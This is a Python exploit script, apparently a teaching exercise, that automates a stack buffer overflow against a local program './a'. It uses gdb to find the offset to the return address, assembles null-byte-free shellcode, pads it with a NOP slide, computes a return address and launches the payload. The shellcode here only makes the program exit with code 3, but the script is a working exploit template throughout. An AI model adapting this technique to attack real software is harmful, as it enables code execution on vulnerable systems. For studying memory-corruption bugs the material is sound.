import os
import re
import struct
import subprocess

import assemble


# Find what's the offset of buff from the return address.
for n in range(1024, 2048):
    magic  = 'b'*4
    buff   = 'a'*n + magic
    print('trying buff size %d...' % n)
    try:
        # gdb <program> --batch -ex <command> -ex <command> ... loads <program> into gdb and runs all the <commands> on it.
        output = subprocess.check_output(['gdb', './a', '--batch',
            '-ex', 'run %s' % buff,
            '-ex', 'print $eip',
            '-ex', 'print $esp',
            '-ex', 'quit',
        ])
    except subprocess.CalledProcessError:
        print('gdb crashed')
        continue
    if 'SIGSEGV' not in output:
        print('program did not crash')
        continue
    # The "print $eip" command prints $1 = 0x...
    eip = re.search(r'\$1 =.*?0x([0-9a-f]*)', output).group(1)
    # The "print $esp" command prints $2 = 0x...
    esp = re.search(r'\$2 =.*?0x([0-9a-f]*)', output).group(1)
    # If EIP == magic it means the magic landed precisely on the return address, so we've found the offset of buff from it.
    if eip == magic.encode('hex'):
        break
print('buff offset is %d' % n)

# Assemble our shellcode.
shellcode = assemble.assemble_data('''

# MOV EAX, 1 contains null bytes, so we MOV EAX, -1 and INC it twice.
MOV EAX, -1
INC EAX
INC EAX

# MOV EBX, 3 contains null bytes, so we MOV EBX, -1 and INC it four times.
MOV EBX, -1
INC EBX
INC EBX
INC EBX
INC EBX

# Call system call 1 (exit) with argument 3 (exit code).
INT 0x80

''')
print('shellcode size is %d' % len(shellcode))

# Create our NOP slide.
nop_slide = (n - len(shellcode))*'\x90'
print('nop slide size is %d' % len(nop_slide))

# Compute the desired return address.
# We aim for the middle of the NOP slide so we take ESP right after the crash - 4 (for the return address) - len(shellcode) - len(nop_slide)/2.
return_address = int(esp, 16) - 4 - len(shellcode) - len(nop_slide)/2
print('desired return address is %08x' % return_address)

# Let's go!
os.execl('./a', './a', nop_slide + shellcode + struct.pack('<I', return_address))

# NOTE: The NOP slide is critical, since running ./a via gdb and via python causes about 0x10 bytes of difference in the initial stack address.
